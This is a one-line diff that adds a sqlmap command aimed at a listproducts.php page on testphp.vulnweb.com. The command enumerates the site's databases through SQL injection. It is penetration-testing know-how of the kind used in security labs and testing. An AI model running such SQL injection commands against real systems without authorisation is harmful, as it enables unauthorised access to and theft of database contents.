@@ -1,0 +1,1 @@
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
